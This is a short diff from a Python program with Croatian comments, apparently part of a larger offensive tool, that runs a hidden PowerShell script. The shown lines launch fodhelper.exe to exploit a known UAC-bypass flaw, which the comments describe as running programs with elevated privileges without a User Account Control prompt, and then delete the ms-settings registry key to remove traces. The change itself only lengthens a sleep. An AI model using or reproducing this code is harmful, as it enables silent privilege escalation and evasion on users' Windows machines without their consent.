@@ -101,7 +101,7 @@ class Inicijalizacija:
         Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden # fodhelper.exe je windows program koji ima sigurnosni propust koji dopušta
                                                                               # pokretanje programa s eleviranim privilegijama bez User Account Control prozora
         
-        Start-Sleep 3
+        Start-Sleep 5
         Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force     # Brisanje registry itema nakon što su iskorišteni za fodhelper.exe sigurnosni propust
         """
         subprocess.call(["powershell.exe", "-WindowStyle", "Hidden", "-Command", powershell_script])    # Poziv powershell skripte
